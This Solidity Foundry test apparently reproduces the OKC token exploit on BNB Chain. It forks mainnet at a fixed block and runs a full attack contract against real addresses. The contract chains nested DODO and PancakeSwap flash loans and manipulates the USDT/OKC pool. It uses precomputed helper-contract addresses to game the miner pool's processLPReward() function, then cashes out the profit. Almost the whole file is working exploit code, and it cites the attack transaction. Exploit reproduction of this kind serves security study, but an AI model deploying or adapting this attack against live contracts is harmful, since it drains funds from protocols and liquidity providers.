// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "../interface.sol";


// @Analysis
// https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b
// @TX
// https://dashboard.tenderly.co/tx/bnb/0xd85c603f71bb84437bc69b21d785f982f7630355573566fa365dbee4cd236f08




contract ContractTest is Test {


    AttackContract public attack_contract;

    function setUp() public {
        vm.createSelectFork("bsc", 33_464_598);
        assertEq(block.number, 33_464_598);
        attack_contract = new AttackContract();
        setLabel();
        vm.deal(address(this), 1 ether);
    }

    function setLabel() private {
        vm.label(address(this), "Attacker");
        vm.label(address(attack_contract), "AttackContract");
        vm.label(address(attack_contract.DPP1()), "0x8191_DPPAdvanced");
        vm.label(address(attack_contract.DPP2()), "0xfeaf_DPPOracle");
        vm.label(address(attack_contract.DPP3()), "0x26d0_DPPOracle");
        vm.label(address(attack_contract.DPP4()), "0x6098_DPP");
        vm.label(address(attack_contract.DPP4()), "0x6098_DPP");
        vm.label(address(attack_contract.DPP5()), "0x9ad3_DPPOracle");
        vm.label(address(attack_contract.pancakeV3Pool()), "PancakeV3Pool");
        vm.label(address(attack_contract.pancakePair_USDT_OKC()), "PancakePair_USDT_OKC");
        vm.label(address(attack_contract.USDT()), "USDT");
        vm.label(address(attack_contract.OKC()), "OKC");
        vm.label(address(attack_contract.pancakeRouter()), "PancakeRouter");
    }


    function testExploit() public {
        // 0.000000000000000001
        attack_contract.expect1{value: 1 ether}();
    }


}


contract AttackContract is IDODOCallee {
    uint256 public nonce = 1;
    AttackContract2 public attack_contract1;
    AttackContract2 public attack_contract2;


    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
    address payable public minerPool = payable(address(0x36016C4F0E0177861E6377f73C380c70138E13EE));

    IDPPOracle public DPP1 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle public DPP2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle public DPP3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle public DPP4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle public DPP5 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IPancakeV3Pool public pancakeV3Pool = IPancakeV3Pool(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    IPancakeRouter public pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair public pancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);


    function approveAll() internal {
        OKC.approve(address(pancakeRouter), type(uint256).max);
        pancakePair_USDT_OKC.approve(address(pancakeRouter), type(uint256).max);
    }


    function expect1() external payable {
        uint256 size;
        address aaa = address(this);
        assembly {size := extcodesize(aaa)}
        console2.log("transfer_all size is: ", size);
        approveAll();
        console2.log("minerPool OKC: ", OKC.balanceOf(address(minerPool)), ", ", uint256(OKC.balanceOf(address(minerPool)) / 1e18));
        console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
        console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));

        uint256 amount = USDT.balanceOf(address(DPP1));
        DPP1.flashLoan(0, amount, address(this), "0");
        uint256 shengyu = USDT.balanceOf(address(this));
        console2.log("usdt amount profit: ", shengyu, " ", uint256(shengyu / 1e18));

        console2.log("minerPool OKC: ", OKC.balanceOf(address(minerPool)), ", ", uint256(OKC.balanceOf(address(minerPool)) / 1e18));
        console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
        console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
    }


    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {

        if (keccak256(data) == keccak256(bytes("0"))) {
            uint256 amount = USDT.balanceOf(address(DPP2));
            DPP2.flashLoan(0, amount, address(this), "1");
            USDT.transfer(address(DPP1), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("1"))) {
            uint256 amount = USDT.balanceOf(address(DPP3));
            DPP3.flashLoan(0, amount, address(this), "2");
            USDT.transfer(address(DPP2), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("2"))) {
            uint256 amount = USDT.balanceOf(address(DPP4));
            DPP4.flashLoan(0, amount, address(this), "3");
            USDT.transfer(address(DPP3), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("3"))) {
            uint256 amount = USDT.balanceOf(address(DPP5));
            DPP5.flashLoan(0, amount, address(this), "4");
            USDT.transfer(address(DPP4), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("4"))) {
            uint256 amount = USDT.balanceOf(address(DPP5));
            pancakeV3Pool.flash(address(this), 2500_000_000_000_000_000_000_000, 0, abi.encodePacked(uint256(2500_000_000_000_000_000_000_000)));
            USDT.transfer(address(DPP5), quoteAmount);
        }
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 amount_flash = abi.decode(data, (uint256));
        uint256 ust_amount = USDT.balanceOf(address(this));
        console2.log("usdt amount: ", ust_amount, ", ", uint256(ust_amount / 1e18));
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");


        swap();
        mint();
        USDT.transfer(address(pancakeV3Pool), amount_flash + fee0);
    }


    function swap() private {
        console2.log("--- Step 1: Redeem OKC with Borrowed Points USDT");
        address[] memory a = new address[](2);
        a[0] = address(USDT);
        a[1] = address(OKC);

        uint256 reserve0= USDT.balanceOf(address(pancakePair_USDT_OKC));
        uint256 reserve1= OKC.balanceOf(address(pancakePair_USDT_OKC));
        console2.log("LP swap before reserves = ", reserve0, ", ",reserve1);

        uint256[] memory out = pancakeRouter.getAmountsOut(130_000_000_000_000_000_000_000, a);
        //assert(out[0] == 130000000000000000000000);
        //assert(out[1] == 28109225547221109324317);
        pancakePair_USDT_OKC.swap(
            1,
            28108225547221109324317,
            address(this),
            abi.encodePacked(uint256(130_000_000_000_000_000_000_000))
        );

        uint256 reserve011= USDT.balanceOf(address(pancakePair_USDT_OKC));
        uint256 reserve122= OKC.balanceOf(address(pancakePair_USDT_OKC));
        console2.log("LP swap after reserves = ", reserve011, ", ",reserve122);

        uint256 usdt_amount = USDT.balanceOf(address(this));
        uint256 okc_amount = OKC.balanceOf(address(this));
        //assert(usdt_amount == 2623399993009917185325960);
        //assert(okc_amount == 27264978780804476044588);
        console2.log("usdt amount(swap end): ", usdt_amount, ", ", uint256(usdt_amount / 1e18));
        console2.log("okc amount(swap end): ", okc_amount, ", ", uint256(okc_amount / 1e18));
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");

    }

    function mint() private {

        console2.log("--- Step 2: Staking Liquidity");
        address new_attack_contract1 = calculateAddress(address(this), nonce);
        console2.log("Advance Calculation Contract Address(new_attack_contract2): ", new_attack_contract1);
        //vm.label(address(attack_contract2), "AttackContract2");
        OKC.transfer(address(new_attack_contract1), 10_000_000_000_000_000);
        attack_contract1 = new AttackContract2();

        nonce++;
        uint256 size;
        assembly {size := extcodesize(new_attack_contract1)}
        console2.log("transfer_all size is: ", size);

        address new_attack_contract2 = calculateAddress(address(this), nonce);
        console2.log("Advance Calculation Contract Address(new_attack_contract3): ", new_attack_contract2);

        USDT.transfer(address(new_attack_contract2), 100_000_000_000_000);
        OKC.transfer(address(new_attack_contract2), 1);
        attack_contract2 = new AttackContract2();
        //vm.label(address(attack_contract3), "AttackContract3");


        (uint112 reserve0,uint112 reserve1,uint32 blockTimeLast) = pancakePair_USDT_OKC.getReserves();
        //assert(reserve0 == 139293866156595223760844);
        //assert(reserve1 == 2015600963959283799829);
        console2.log("getReserves: ", reserve0, reserve1, blockTimeLast);
        uint256 okc_amount3 = OKC.balanceOf(address(this));


        uint256 amountb = pancakeRouter.quote(okc_amount3, reserve1, reserve0);
        //assert(amountb == 1884223603791570904823359);
        USDT.transfer(address(pancakePair_USDT_OKC), amountb);


        uint256 okc_amount4 = OKC.balanceOf(address(this));
        //assert(okc_amount4 == 27264968780804476044587);
        OKC.transfer(address(pancakePair_USDT_OKC), okc_amount4);


        uint256 lp1 = pancakePair_USDT_OKC.mint(address(this));
        //assert(lp1 == 225705840317082411194413);
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
        console2.log("attack_contract1 lp = ", pancakePair_USDT_OKC.balanceOf(address(attack_contract1)));
        console2.log("attack_contract2 lp = ", pancakePair_USDT_OKC.balanceOf(address(attack_contract2)));



        uint256 lp_amount1 = pancakePair_USDT_OKC.balanceOf(address(this));
        console2.log("this LP: ", lp_amount1);
        pancakePair_USDT_OKC.transfer(address(attack_contract2), lp_amount1);


        console2.log("--- Step 3: Main attack point");
        // MinerPool.call{value: 1 wei}(""); // Attackers use this method
        minerPool.call(abi.encodeWithSignature("processLPReward()"));
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
        //assert(225705840317082411194413 == pancakePair_USDT_OKC.balanceOf(address(attack_contract2)));
        uint256 tmp1 = attack_contract2.transfer_all(address(pancakePair_USDT_OKC), address(this));
        //assert(tmp1 == 225705840317082411194413);

        uint256 lp_amount2 = pancakePair_USDT_OKC.balanceOf(address(this));
        //assert(225705840317082411194413 == lp_amount2);
        (uint256 a,uint256 b) = pancakeRouter.removeLiquidity(address(OKC), address(USDT), lp_amount2, 0, 0, address(this), block.timestamp + 1000);
        //assert(a == 27264977626947917860405);
        //assert(b == 1884223603891570904823358);

        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");

        uint256 tmp2 = attack_contract1.transfer_all(address(OKC), address(this));
        //assert(tmp2 == 272649687808044760445);
        uint256 tmp3 = attack_contract2.transfer_all(address(OKC), address(this));
        //assert(tmp3 == 77890958849117701118009);


        console2.log("--- Step 4: Withdraw earnings");
        uint256 okc_amount5 = OKC.balanceOf(address(this));
        //assert(104610636835065226203047 == okc_amount5);


        address[] memory path = new address[](2);

        path[0] = address(OKC);
        path[1] = address(USDT);

        console2.log("okc amount = ", OKC.balanceOf(address(this)),", ",OKC.balanceOf(address(this))/1e18);
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
        console2.log("swap OKC to USDT");
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            okc_amount5,
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
        console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
        console2.log("usdt amount = ", USDT.balanceOf(address(this)),", ",USDT.balanceOf(address(this))/1e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        USDT.transfer(address(pancakePair_USDT_OKC), amount);
        console2.log("USDT transfer to LP: ", amount, ", ", uint256(amount / 1e18));
        console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)));
        console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)));
    }


    function getTokenPrice() public view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(OKC);
        path[1] = address(USDT);
        uint256[] memory amounts = pancakeRouter.getAmountsOut(1e18, path);
        return amounts[1];
    }

    function calculateAddress(address creator, uint256 nonce) public pure returns (address) {
        bytes memory data;
        if (nonce == 0x00) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80));
        } else if (nonce <= 0x7f) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, uint8(nonce));
        } else if (nonce <= 0xff) {
            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), uint8(nonce));
        } else if (nonce <= 0xffff) {
            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), creator, bytes1(0x82), uint16(nonce));
        } else if (nonce <= 0xffffff) {
            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), creator, bytes1(0x83), uint24(nonce));
        } else {
            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(nonce));
        }
        return address(uint160(uint(keccak256(data))));
    }


}

contract AttackContract2 {
    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
    IPancakePair public PancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);
    constructor() {
        uint256 amount = USDT.balanceOf(address(this));
        USDT.transfer(address(PancakePair_USDT_OKC), amount);
        uint256 amount2 = OKC.balanceOf(address(this));
        OKC.transfer(address(PancakePair_USDT_OKC), amount2);
    }


    function transfer_all(address token, address to) public returns (uint256) {
        uint256 size;
        address aaa = address(this);
        assembly {size := extcodesize(aaa)}
        console2.log("transfer_all size is: ", size);
        uint256 amount = IERC20(token).balanceOf(address(this));
        if (IERC20(token).transfer(to, amount)) {
            return amount;
        } else {
            revert("transfer error");
        }
    }

}



